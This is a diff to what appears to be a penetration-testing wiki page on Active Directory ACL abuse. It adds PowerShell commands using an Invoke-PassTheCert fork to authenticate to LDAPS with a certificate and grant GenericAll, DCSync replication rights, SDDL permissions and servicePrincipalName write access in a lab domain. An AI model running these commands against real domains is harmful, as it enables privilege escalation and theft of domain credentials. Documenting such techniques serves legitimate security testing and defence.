@@ -71,6 +71,40 @@ Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIden
 Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
 ```
 
+Alternatively, the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+> Also, its [DeepDiveIntoACEsAndSDDLs](https://github.com/jamarir/Invoke-PassTheCert/tree/main/utils/DeepDiveIntoACEsAndSDDLs) can be looked up for indepth details and granular exploitations (ACEs, SDDLs).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Grant Full Control permissions to 'Zack ZS. STRIFE' against 'ESARVI01$'
+Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Zack ZS. STRIFE,CN=Users,DC=X' -Target 'CN=ESARVI01,CN=Computers,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'
+
+# Grant DCSync (method 1) to 'Wanha BE. ERUT' against 'ADLAB.LOCAL'
+Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes' -Target 'DC=ADLAB,DC=LOCAL'
+Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'DS-Replication-Get-Changes-All' -Target 'DC=ADLAB,DC=LOCAL'
+
+# Grant DCSync (method 2, using GUIDs instead, same as method 1) to 'Wanha BE. ERUT' against 'ADLAB.LOCAL'
+Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -Target 'DC=ADLAB,DC=LOCAL'
+Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Wanha BE. ERUT,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -Target 'DC=ADLAB,DC=LOCAL'
+
+# Grant DCSync (method 3, same as method 1) to 'Wanha BE. ERUT' against 'ADLAB.LOCAL'
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'DCSync' -Identity 'CN=Wanha BE. ERUT,CN=Users,DC=X' -Target 'DC=ADLAB,DC=LOCAL'
+
+# Grant the 'RCSDWDWORPWPCCDCLCSWLODT' SDDL permissions to 'Wanha BE. EDMIN' against the 'COMPUTATOR$' computer
+Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection $LdapConnection -Identity 'CN=Wanha BE. EDMIN,CN=Users,DC=X' -Target 'CN=COMPUTATOR,CN=Computers,DC=X' -SDDLACEType 'OA' -SDDLACERights 'RCSDWDWORPWPCCDCLCSWLODT'
+
+# Grant the 'RPWP' (Read Property, Write Property) SDDL permissions to 'J0hn JR. RIPP3R' against the 'SVC SU. USER':'serviceprincipalname' user's attribute
+Invoke-PassTheCert -Action 'CreateInboundSDDL' -LdapConnection $LdapConnection -Identity 'CN=J0hn JR. RIPP3R,CN=Users,DC=X' -Target 'CN=SVC SU. USER,CN=Users,DC=X' -Attribute 'serviceprincipalname' -SDDLACEType 'OA' -SDDLACERights 'RPWP'
+```
+
 > [!TIP]
 > A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work
 
